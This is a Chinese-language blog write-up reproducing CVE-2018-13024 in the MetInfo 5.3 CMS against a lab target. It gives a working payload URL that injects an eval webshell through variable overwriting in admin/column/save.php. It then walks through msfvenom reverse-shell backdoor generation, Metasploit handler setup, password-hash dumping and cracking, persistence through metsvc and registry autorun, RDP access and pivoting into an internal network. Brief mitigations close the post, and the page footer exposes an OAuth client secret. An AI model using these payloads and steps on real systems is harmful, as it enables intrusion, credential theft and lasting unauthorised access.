<!DOCTYPE html>
<html>

<head><meta name="generator" content="Hexo 3.9.0">
  
  <title>CVE-2018-13024 - Cupid&#39;s Blog</title>
  <meta charset="UTF-8">
  <meta name="description" content="a new ctfer&#39;s study">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  
  

  <link rel="shortcut icon" href="/favicon.ico" type="image/png">
  <meta name="description" content="1 引言  1.1 漏洞背景  MetInfo是中国米拓信息技术有限公司的一套使用PHP和Mysql开发的内容管理系统（CMS）。">
<meta property="og:type" content="article">
<meta property="og:title" content="CVE-2018-13024">
<meta property="og:url" content="http://yoursite.com/2019/12/17/CVE-2018-13024/index.html">
<meta property="og:site_name" content="Cupid&#39;s Blog">
<meta property="og:description" content="1 引言  1.1 漏洞背景  MetInfo是中国米拓信息技术有限公司的一套使用PHP和Mysql开发的内容管理系统（CMS）。">
<meta property="og:locale" content="default">
<meta property="og:image" content="https://raw.githubusercontent.com/bephplover/bephplover.github.io/master/img/SRC/4.png">
<meta property="og:image" content="https://raw.githubusercontent.com/bephplover/bephplover.github.io/master/img/SRC/6.png">
<meta property="og:image" content="https://raw.githubusercontent.com/bephplover/bephplover.github.io/master/img/SRC/7.png">
<meta property="og:image" content="https://raw.githubusercontent.com/bephplover/bephplover.github.io/master/img/SRC/9.png">
<meta property="og:image" content="https://raw.githubusercontent.com/bephplover/bephplover.github.io/master/img/SRC/10.png">
<meta property="og:image" content="https://raw.githubusercontent.com/bephplover/bephplover.github.io/master/img/SRC/11.png">
<meta property="og:image" content="https://raw.githubusercontent.com/bephplover/bephplover.github.io/master/img/SRC/12.png">
<meta property="og:image" content="https://raw.githubusercontent.com/bephplover/bephplover.github.io/master/img/SRC/13.png">
<meta property="og:image" content="https://raw.githubusercontent.com/bephplover/bephplover.github.io/master/img/SRC/14.png">
<meta property="og:image" content="https://raw.githubusercontent.com/bephplover/bephplover.github.io/master/img/SRC/15.png">
<meta property="og:image" content="https://raw.githubusercontent.com/bephplover/bephplover.github.io/master/img/SRC/16.png">
<meta property="og:image" content="https://raw.githubusercontent.com/bephplover/bephplover.github.io/master/img/SRC/18.png">
<meta property="og:image" content="https://raw.githubusercontent.com/bephplover/bephplover.github.io/master/img/SRC/19.png">
<meta property="og:image" content="https://raw.githubusercontent.com/bephplover/bephplover.github.io/master/img/SRC/20.png">
<meta property="og:image" content="https://raw.githubusercontent.com/bephplover/bephplover.github.io/master/img/SRC/21.png">
<meta property="og:image" content="https://raw.githubusercontent.com/bephplover/bephplover.github.io/master/img/SRC/22.png">
<meta property="og:image" content="https://raw.githubusercontent.com/bephplover/bephplover.github.io/master/img/SRC/23.png">
<meta property="og:updated_time" content="2020-01-02T12:36:24.120Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="CVE-2018-13024">
<meta name="twitter:description" content="1 引言  1.1 漏洞背景  MetInfo是中国米拓信息技术有限公司的一套使用PHP和Mysql开发的内容管理系统（CMS）。">
<meta name="twitter:image" content="https://raw.githubusercontent.com/bephplover/bephplover.github.io/master/img/SRC/4.png">
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/mdui@0.4.3/dist/css/mdui.min.css">
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.15.8/styles/atom-one-dark.css">
  
  
  <link rel="stylesheet" href="//at.alicdn.com/t/font_1038733_0xvrvpg9c0r.css">
  <link rel="stylesheet" href="/css/style.css?v=1577969617795">
</head>

<body class="mdui-drawer-body-left">
  
  <div id="nexmoe-background">
    <div class="nexmoe-bg" style="background-image: url(http://p0.ssl.cdn.btime.com/t01cd55c4b5ab3036c2.jpg#是博客的背景，又是文章默认头图)"></div>
    <div class="mdui-appbar mdui-shadow-0">
      <div class="mdui-toolbar">
        <a mdui-drawer="{target: '#drawer', swipe: true}" title="menu" class="mdui-btn mdui-btn-icon"><i class="mdui-icon material-icons">menu</i></a>
        <div class="mdui-toolbar-spacer"></div>
        <!--<a href="javascript:;" class="mdui-btn mdui-btn-icon"><i class="mdui-icon material-icons">search</i></a>-->
        <a href="/" title="Cupid" class="mdui-btn mdui-btn-icon"><img src="/images/namei.png"></a>
       </div>
    </div>
  </div>
  <div id="nexmoe-header">
      <div class="nexmoe-drawer mdui-drawer" id="drawer">
    <div class="nexmoe-avatar mdui-ripple">
        <a href="/" title="Cupid">
            <img src="/images/namei.png" alt="Cupid">
        </a>
    </div>
    <div class="nexmoe-count">
        <div><span>Articles</span>61</div>
        <div><span>Tags</span>0</div>
        <div><span>Categories</span>0</div>
    </div>
    <ul class="nexmoe-list mdui-list" mdui-collapse="{accordion: true}">
        
        <a class="nexmoe-list-item mdui-list-item mdui-ripple" href="/" title="回到首页">
            <i class="mdui-list-item-icon nexmoefont icon-home"></i>
            <div class="mdui-list-item-content">
                回到首页
            </div>
        </a>
        
        <a class="nexmoe-list-item mdui-list-item mdui-ripple" href="/about.html" title="关于博客">
            <i class="mdui-list-item-icon nexmoefont icon-info-circle"></i>
            <div class="mdui-list-item-content">
                关于博客
            </div>
        </a>
        
        <a class="nexmoe-list-item mdui-list-item mdui-ripple" href="/PY.html" title="我的朋友">
            <i class="mdui-list-item-icon nexmoefont icon-unorderedlist"></i>
            <div class="mdui-list-item-content">
                我的朋友
            </div>
        </a>
        
    </ul>
    <aside id="nexmoe-sidebar">
  
  <div class="nexmoe-widget-wrap">
    <h3 class="nexmoe-widget-title">Social</h3>
    <div class="nexmoe-widget nexmoe-social">
        <a class="mdui-ripple" href="https://space.bilibili.com/23290461" target="_blank" mdui-tooltip="{content: '哔哩哔哩'}" style="color: rgb(231, 106, 141);background-color: rgba(231, 106, 141, .15);">
            <i class="nexmoefont icon-bilibili"></i>
        </a><a class="mdui-ripple" href="https://github.com/bephplover" target="_blank" mdui-tooltip="{content: 'GitHub'}" style="color: rgb(25, 23, 23);background-color: rgba(25, 23, 23, .15);">
            <i class="nexmoefont icon-github"></i>
        </a>
    </div>
</div>
  
  

  
  
  
  
  <div class="nexmoe-widget-wrap">
    <h3 class="nexmoe-widget-title">Archive</h3>
    <div class="nexmoe-widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/12/">December 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/11/">November 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">October 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/09/">September 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/08/">August 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/07/">July 2019</a></li></ul>
    </div>
  </div>


  
</aside>
    <div class="nexmoe-copyright">
        &copy; 2020 Cupid
        Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
        & <a href="https://nexmoe.com/hexo-theme-nexmoe.html" target="_blank">Nexmoe</a>
    </div>
</div><!-- .nexmoe-drawer -->
  </div>
  <div id="nexmoe-content">
    <div class="nexmoe-primary">
        <div class="nexmoe-post">
    <div class="nexmoe-post-cover"> 
        
        <img src="https://i.loli.net/2019/07/21/5d33d5dc1531213134.png">
        
        <h1>CVE-2018-13024</h1>
    </div>
  <div class="nexmoe-post-meta">
    <a><i class="nexmoefont icon-calendar-fill"></i>2019年12月17日</a>
    <a><i class="nexmoefont icon-areachart"></i>3.8k 字</a>
    <a><i class="nexmoefont icon-time-circle-fill"></i>大概 16 分钟</a>
    
    
  </div>
  <article>
    <h1>1 引言</h1>
<h2> 1.1 漏洞背景 </h2>
MetInfo是中国米拓信息技术有限公司的一套使用PHP和Mysql开发的内容管理系统（CMS）。<a id="more"></a>而Metinfo 6.0.0以及Metlnfo5.3.x版本中存在安全漏洞。远程攻击者在登陆进admin后台后，可通过向admin/column/save.php文件发送‘module’参数利用该漏洞向某个路径下写入代码并让其执行。<!--more-->
exp:该漏洞是metinfo5.3版本下的一个任意变量覆盖导致的任意文件上传，因而可以上传我们的一句话木马，并用蚁剑进行连接，在获取到了webshell的情况下，我们再对其进行简单的域信息收集，路由信息收集，然后对其进行简单的内网渗透。
影响版本:Metlnfo5.3.x&&Metlnfo6.0.0
<h1> 2 复现环境、工具及其简介 </h1>
<h2> 2.1 复现使用环境、工具 </h2>
攻击机:windows10,kali
靶机: windows 2003 Enterprise Edition
使用工具:win10上的蚁剑、Seay源代码审计系统、火狐浏览器,kali上的metasploit的msf5(meterpreter模块)
<h2> 2.2工具简介 </h2>
<h3>2.2.1 蚁剑简介</h3>
  中国蚁剑是一款开源的跨平台网站管理工具，它主要面向于合法授
权的渗透测试安全人员以及进行常规操作的网站管理员。是一款非常优秀的webshell管理工具。蚁剑主界面如图2-1所示:
![](https://raw.githubusercontent.com/bephplover/bephplover.github.io/master/img/SRC/2.png) 
图2-1蚁剑界面
蚁剑的命令行功能如图2-2所示:
 ![](https://raw.githubusercontent.com/bephplover/bephplover.github.io/master/img/SRC/3.png)
图2-2蚁剑命令行
蚁剑的核心功能有以下几种:
a.Shell代理功能
b.Shell管理
c.文件管理
d.虚拟终端
e.数据库管理
f.插件市场
g.插件开发
其中开发版本针对有一定编程基础的开发者，你可以根据阅读文档或者分析源码了解熟悉整个应用的执行流程，然后便可随意对代码进行修改增强个性化自定义，真正打造出属于自己的一把宝剑。
<h3>2.2.3 Seay源码审计系统简介</h3>
Seay源码审计系统是尹毅基于C#语言开发的一款针对PHP代码安全性审计的系统，主要运行于Windows系统上。这款软件能够发现SQL注入、代码执行、命令执行、文件包含、文件上传、绕过转义防护、拒绝服务、XSS跨站、信息泄露、任意URL跳转等漏洞，基本上覆盖常见PHP漏洞。另外，在功能上，它支持一键审计、代码调试、函数定位、插件扩展、自定义规则配置、代码高亮、编码调试转换、数据库执行监控等数十项强大功能。

<p>Seay源码审计系统界面如图2-3所示:<br><img src="https://raw.githubusercontent.com/bephplover/bephplover.github.io/master/img/SRC/4.png" alt><br>图2-3Seay源码审计界面</p>
<h3>2.2.3 MSF5简介</h3>
<h1>3 漏洞分析</h1>
##     3.1 漏洞原理 ##
   该漏洞主要发生在metinfo5.3的\admin\column\save.php的
column_copyconfig函数.这里我们使用Seay源代码审计系统对代码进行审计，首先打开metinfo5.3作为项目，然后打开column下的save.php找到这个函数如示:column_copyconfig($foldername,$module,$id);
我们对函数进行定位，这个原函数在\admin\column\global.func.php中，在这个函数中又调用了Copyindx函数如下所示:
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Copyindx(ROOTPATH.$foldername.<span class="string">'/index.php'</span>,$module);</span><br></pre></td></tr></table></figure>

<p>再次定位该函数，这次在\admin\include\global.func.php中找到了该函数:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Copyindx</span><span class="params">($newindx,$type)</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(!file_exists($newindx))&#123;</span><br><span class="line">		$oldcont =<span class="string">"&lt;?php\n# MetInfo Enterprise Content Management System \n# Copyright (C) MetInfo Co.,Ltd (http://www.metinfo.cn). All rights reserved. \n\$filpy = basename(dirname(__FILE__));\n\$fmodule=$type;\nrequire_once '../include/module.php'; \nrequire_once \$module; \n# This program is an open source system, commercial use, please consciously to purchase commercial license.\n# Copyright (C) MetInfo Co., Ltd. (http://www.metinfo.cn). All rights reserved.\n?&gt;"</span>;</span><br><span class="line">		$fp = fopen($newindx,w);</span><br><span class="line">		fputs($fp, $oldcont);</span><br><span class="line">		fclose($fp);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到该函数会复制一个index.php文件到调用它的地方，这里如果oldcont函数中的变量可控，然后再让该函数调用的话，那么就可以进行任意文件的写入，我们可以直接写入一句话木马。接下来对其中的变量进行探讨：<br>$fmodule=$type;最重要的就是这两个变量，其中$type是函数传入的，我们再看一下之前的column下的column_copyconfig文件中调用Copyindx使用的变量$module,因而只要改变$module变量的值，就可以导致我们写入想要的内容并在自己想要的路径下生成index.php.<br>这里通过查询Metinfo的漏洞会发现它有一个经典的伪全局变量覆盖，在metinfo5.3\admin\include\common.inc.php中</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span>(<span class="keyword">array</span>(<span class="string">'_COOKIE'</span>, <span class="string">'_POST'</span>, <span class="string">'_GET'</span>) <span class="keyword">as</span> $_request) &#123;</span><br><span class="line">    <span class="keyword">foreach</span>($$_request <span class="keyword">as</span> $_key =&gt; $_value) &#123;</span><br><span class="line">        $_key&#123;<span class="number">0</span>&#125; != <span class="string">'_'</span> &amp;&amp; $$_key = daddslashes($_value,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>);</span><br><span class="line">        $_M[<span class="string">'form'</span>][$_key]=daddslashes($_value,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里我们可以直接传入get参数，覆盖掉$module变量，将其变为一句话内容。<br>payload构造:</p>
<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">Payload:</span>admin<span class="meta-keyword">/column/</span>save.php?name=<span class="number">123</span><span class="variable">&amp;action</span>=editor<span class="variable">&amp;foldername</span>=upload<span class="variable">&amp;module</span>=<span class="number">22</span>;@eval($_POST[a]);<span class="comment">/*</span></span><br></pre></td></tr></table></figure>

<p>3.2 漏洞危害<br>由以上原理就可知道，通过该漏洞可以进行任意文件的上传，可以通过脚本无限上传占内存文件让其服务器崩溃，还可以上传一句话木马文件对其服务器下的文件进行管理，还可以上传其他木马文件对Tomcat服务器造成毁灭性的打击等等。</p>
<h1 id="4-漏洞复现"><a href="#4-漏洞复现" class="headerlink" title="4 漏洞复现"></a>4 漏洞复现</h1><h2 id="4-1-漏洞的环境搭建"><a href="#4-1-漏洞的环境搭建" class="headerlink" title="4.1 漏洞的环境搭建"></a>4.1 漏洞的环境搭建</h2><h2 id="4-2-漏洞的复现步骤"><a href="#4-2-漏洞的复现步骤" class="headerlink" title="4.2 漏洞的复现步骤"></a>4.2 漏洞的复现步骤</h2><h3>4.2.1 getwebshell</h3>
首先我们通过其IP地址访问到该网站为如图4-1所示:
 ![](https://raw.githubusercontent.com/bephplover/bephplover.github.io/master/img/SRC/5.png)
图4-1靶机网站首页

<p>首先对网站进行信息收集，往下翻会看到该网站采用的系统为如图4-2所示:<br><img src="https://raw.githubusercontent.com/bephplover/bephplover.github.io/master/img/SRC/6.png" alt><br>图4-2<br>由此可以知道该网站的版本是Metinfo5.3.15版本，上网查一波资料，就会发现该版本存在着CVE-2018-13024的漏洞。也就是本次需要复现的漏洞。然后我们在本机同样装一个Metinfo5.3.15然后对其进行代码审计，分析其漏洞成因。</p>
<p>通过漏洞说明我们可以知道该漏洞主要发生\admin\column\save.php的column_copyconfig函数。于是我们在本地使用Seay源代码审计系统对代码进行审计，首先打开metinfo5.3作为项目，然后打开column下的save.php找到这个函数为: column_copyconfig($foldername,$module,$id);<br>我们对函数进行定位，这个原函数在\admin\column\global.func.php中，在这个函数中又调用了Copyindx函数：<br>Copyindx(ROOTPATH.$foldername.’/index.php’,$module);<br>再次定位该函数，这次在\admin\include\global.func.php中找到了该函数如图4-3所示:<br> <img src="https://raw.githubusercontent.com/bephplover/bephplover.github.io/master/img/SRC/7.png" alt><br>图4-3Coypindx函数位置<br>    可以看到该函数会复制一个index.php文件到调用它的地方，这里如果Copyindx函数中的变量可控，然后再让该函数调用的话，那么就可以进行index.php文件的写入，我们可以直接写入一句话木马。接下来对其中的变量进行探讨：<br>$fmodule=$type;最重要的就是这两个变量，其中$type是函数传入的，我们再看一下之前的column下的column_copyconfig文件中调用Copyindx使用的变量$module,因而只要改变$module变量的值，就可以导致我们写入想要的内容并在自己想要的路径下生成index.php.</p>
<p>这里通过查询Metinfo的漏洞会发现它有一个经典的伪全局变量覆盖，在metinfo5.3\admin\include\common.inc.php中，如图4-4所示:</p>
<p>图4-4经典变量覆盖漏洞代码<br>这里我们可以直接传入get参数，覆盖掉$module变量，将其变为一句话木马，因而需要在之前提到的save.php下构造d如下payload的:<br>Payload:admin/column/save.php?name=123&amp;action=editor&amp;foldername=upload&amp;module=22;@eval($_POST[a]);/*这里需要注意一下post里面写的a而不是’a’,这是因为这个变量覆盖模块对传入的变量进行了daddslashes处理，所有传入的引号都会加上\进行转义，这样会导致一句话连接不上，并且该文件写入只能写入一次，一旦出错，就写入不了任何文件了，因而，必须在本地构造好。</p>
<p>Notice：这个漏洞必须在admin权限下才可以执行，因而第一步应当登入admin后台，这里由于复现主要内容是对于内网渗透的简单学习，故之前的webshell粗糙一点，进行弱口令爆破admin,登录admin后台。<br>在payload输入后，使用蚁剑进行连接，这里我们传入的foldername即为路径，故shell在upload下的index.php</p>
<p>蚁剑连接配置如图4-5所示：<br> <img src="https://raw.githubusercontent.com/bephplover/bephplover.github.io/master/img/SRC/9.png" alt><br>图4-5蚁剑连接配置<br>蚁剑连接成功后如图4-6所示:<br><img src="https://raw.githubusercontent.com/bephplover/bephplover.github.io/master/img/SRC/10.png" alt><br>图4-6蚁剑连接成功</p>
<h1 id="5后渗透"><a href="#5后渗透" class="headerlink" title="5后渗透"></a>5后渗透</h1><h2 id="5-1-使用蚁剑进行域信息收集"><a href="#5-1-使用蚁剑进行域信息收集" class="headerlink" title="5.1 使用蚁剑进行域信息收集"></a>5.1 使用蚁剑进行域信息收集</h2><p>这里我个人觉得直接使用蚁剑的命令行即可获取大量的域信息，例如路由信息等。首先使用whoami以及net user查看当前用户以及权限如图5-1所示：<br> <img src="https://raw.githubusercontent.com/bephplover/bephplover.github.io/master/img/SRC/11.png" alt><br>图5-1蚁剑收集信息<br>这里可以看到已经是Admin权限了，不用提权了<br>使用netstat -ano查看开放的端口如图5-2所示:<br><img src="https://raw.githubusercontent.com/bephplover/bephplover.github.io/master/img/SRC/12.png" alt><br>图5-2查看开放的端口<br>这里的域信息收集可以直接使用这些命令，当然使用msf下的命令能收集到更多内容，于是我们使用msf生成一个后门文件。<br>5.2 msf后渗透<br>首先应传一个后门到目标机，msf生成后门的命令为:msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1. lport=4444 -f exe -o /tmp/hack.exe这样就会在tmp下生成一个后门hack.exe,如图5-4所示:<br><img src="https://raw.githubusercontent.com/bephplover/bephplover.github.io/master/img/SRC/13.png" alt><br>图5-4在kali/tmp下生成后门hack.exe<br>然后需要让kali进行监听状态，需要进行如下设置:</p>
<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">msfconsole  <span class="comment">//打开msf</span></span><br><span class="line">use exploit/multi/handler <span class="comment">//使用监听模块</span></span><br><span class="line">#以下为设置监听信息</span><br><span class="line"><span class="keyword">set</span> payload <span class="comment">windows</span>/meterpreter/<span class="comment">reverse_tcp</span></span><br><span class="line"><span class="keyword">set</span> <span class="comment">lhost 192.168.1.161</span></span><br><span class="line"><span class="keyword">set</span> <span class="comment">lport 4444</span></span><br><span class="line">7run</span><br></pre></td></tr></table></figure>

<p>然后便可以看到kali进入了监听状态如图5-5所示:<br><img src="https://raw.githubusercontent.com/bephplover/bephplover.github.io/master/img/SRC/14.png" alt><br>图5-5MSF下监听中的kali</p>
<p>然后把hack.exe移动到win10上用蚁剑上传文件给目标机,如图5-6:<br><img src="https://raw.githubusercontent.com/bephplover/bephplover.github.io/master/img/SRC/15.png" alt><br>图5-6上传hack.exe</p>
<p>然后在蚁剑上打开终端运行hack.exe即可收到监听信息如下图5-7所示:<br><img src="https://raw.githubusercontent.com/bephplover/bephplover.github.io/master/img/SRC/16.png" alt><br>图5-7收到监听</p>
<p>接下来可以使用meterpreter模块进行域信息收集使用域下常见信息收集命令进行信息收集如getuid,sysinfo,ipconfig等等，如图5-8所示:</p>
<p>图5-8meterpreter信息收集</p>
<p>接下来使用ps查看进程，然后迁移进程。迁移进程的目的是让我们的连接处于一个安全的状态下，以防止被杀，并且迁移进程有助于之后破解密码的实现。我们先尝试不迁移进程试着抓取密码hash值如图5-9所示:<br><img src="https://raw.githubusercontent.com/bephplover/bephplover.github.io/master/img/SRC/18.png" alt><br>图5-9不迁移进程hashdump<br>接下来将我们的hack.exe迁移到一个系统安全进程中，如下图5-10所示:<br><img src="https://raw.githubusercontent.com/bephplover/bephplover.github.io/master/img/SRC/19.png" alt><br>图5-10迁移进程<br>接下来再次尝试hashdump，如图5-11所示:<br><img src="https://raw.githubusercontent.com/bephplover/bephplover.github.io/master/img/SRC/20.png" alt><br>图5-11再次尝试hashdump<br>上图5-11中红圈部分即为，管理员的密码hash值，我们去在线网站进行破解如图5-12所示:<br><img src="https://raw.githubusercontent.com/bephplover/bephplover.github.io/master/img/SRC/21.png" alt><br>图5-12破解hash<br>在成功破解hash后，我们先将我们的权限进行维持，以防之后连接掉线.<br>5.3 权限维持<br>权限维持的原理很简单，就是给目标机开了一个服务 操作的话，使用的是Metasploit的Metsvc模块:rum metsvc,使用-h可以查看帮助，这里直接使用 -A,如图5-13所示:<br><img src="https://raw.githubusercontent.com/bephplover/bephplover.github.io/master/img/SRC/22.png" alt><br>图5-13权限维持<br>我们去靶机看下效果，其实就是给靶机开了个meterpreter服务，如图5-14所示:<br><img src="https://raw.githubusercontent.com/bephplover/bephplover.github.io/master/img/SRC/23.png" alt><br>图5-14靶机验证<br>接下来我们尝试断开连接，并使用exploit/multi/handler模块，payload设置为windows/metsvc_bind_tcp，设置目标ip和绑定端口31337，发现直接可以重新连接了，权限维持成功.<br>这里还可以使用Persistence模块，使用命令:run persistence -U -i 20 -p 5555 -r xx.xx.xx.xx<br>其中-U代表后门在用户登录后自启动，该方式会在HKCU\Software\Microsoft\Windows\CurrentVersion\Run下添加注册表信息。<br>其中-i代表设置反向连接间隔时间，单位S。-p代表设置反向连接的端口号。-r代表设置反向连接的ip地址。这里就不再进行验证了。接下来尝试对其内网系统内的其他机器进行渗透。</p>
<h1> 6 内网渗透 </h1>
<h2> 6.1 远程连接靶机 </h2>
在之前的查询信息ipconfig时，我们发现这台主机有两个网卡，如图6-1所示:
![](https://raw.githubusercontent.com/bephplover/bephplover.github.io/master/img/SRC/24.png) 
图6-1ipconfig查询到有两张网卡
其中一个是我们可以直接访问到的IP即为Metinfo网站，另外一个属于其内网我们访问不到，于是我想到了使用远程连接上靶机的方式，在靶机上对其内网里的其他机器进行渗透。
我们使用如下命令将其3389端口打开，然后使用本地的远程连接工具，进行连接，结合前面破解到的用户名: Administrator密码xf123456.进行连接:
远程连接成功后如图6-2所示:
![](https://raw.githubusercontent.com/bephplover/bephplover.github.io/master/img/SRC/25.png) 
图6-2远程连接靶机成功
接下来我们在靶机上对其内网中的机器进行内网渗透。
## 6.2在靶机上进行内网渗透 ##
   使用meterpreter的arp命令查到靶机中的内网IP，通过之前的远程连接，我们在靶机上使用浏览器访问它的内网机IP在靶机上访问它的内网机，会发现存在有phpmyAdmin目录，那么我们可以利用phpmyadmin的漏洞写入一句话木马得到webshell,使用靶机连上内网机那么再把hack.exe传给内网机，再用kali监听，同样内网渗透就成功了。

<h1 id="7-漏洞的修复与防范"><a href="#7-漏洞的修复与防范" class="headerlink" title="7 漏洞的修复与防范"></a>7 漏洞的修复与防范</h1><p>通过对原理的分析，得出了以下3种防范与修复漏洞的方法如下所示：<br>1.首先这个漏洞是出现在metinfo的固定版本内，因而可以直接更新到最新版本来解决这个漏洞。<br>2.管理后台应当隐藏起来，并且管理员尽量不要使用默认的用户admin,以及使用弱密码，最好在登录验证中自行添加上验证码进行验证，降低黑客入侵的几率。<br>3.其内网的机器不应当有如此简单而又明显的phpadmin漏洞，至少应当将其隐藏，或者更新到最新版本来解决这个问题。</p>
<p>本文参考文章：<a href="https://www.freebuf.com/news/193748.html" target="_blank" rel="noopener">https://www.freebuf.com/news/193748.html</a></p>

  </article>
  
    
<div class="nexmoe-post-copyright">
<i class="mdui-list-item-icon nexmoefont icon-info-circle"></i>
<strong>Author：</strong>Cupid<br>
<strong>Link：</strong><a href="http://yoursite.com/2019/12/17/CVE-2018-13024/" title="http://yoursite.com/2019/12/17/CVE-2018-13024/" target="_blank" rel="noopener">http://yoursite.com/2019/12/17/CVE-2018-13024/</a><br>

  <strong>版权声明：</strong>本文采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/cn/deed.zh" target="_blank">CC BY-NC-SA 3.0 CN</a> 协议进行许可

</div>


  
  <section class="nexmoe-comment">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1.5.0/dist/gitalk.min.css">
<div id="gitalk"></div>
<script src="https://cdn.jsdelivr.net/npm/gitalk@1.5.0/dist/gitalk.min.js"></script>
<script type="text/javascript">
    var gitalk = new Gitalk({
        clientID: '80b2453b6d5f37ad6225',
        clientSecret: '43e99fa852795c9a7b3eb924b2558c64b84bbdeb',
        id: window.location.pathname,
        repo: 'nexmoe.github.io',
        owner: 'nexmoe',
        admin: 'nexmoe'
    })
    gitalk.render('gitalk')
</script>
</section>
</div>
    </div>
  </div>
  <script src="https://cdn.jsdelivr.net/npm/mdui@0.4.3/dist/js/mdui.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/jquery@3.4.1/dist/jquery.min.js"></script>




<script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.15.8/build/highlight.min.js"></script>
<script>hljs.initHighlightingOnLoad();</script>

<script src="/js/app.js?v=1577969617836"></script>
<script src="https://cdn.jsdelivr.net/npm/lazysizes@5.1.0/lazysizes.min.js"></script>


    <script type="text/javascript" src="https://cdn.jsdelivr.net/gh/xtaodada/xtaodada.github.io@0.0.2/copy.js"></script>



  





</body>

</html>
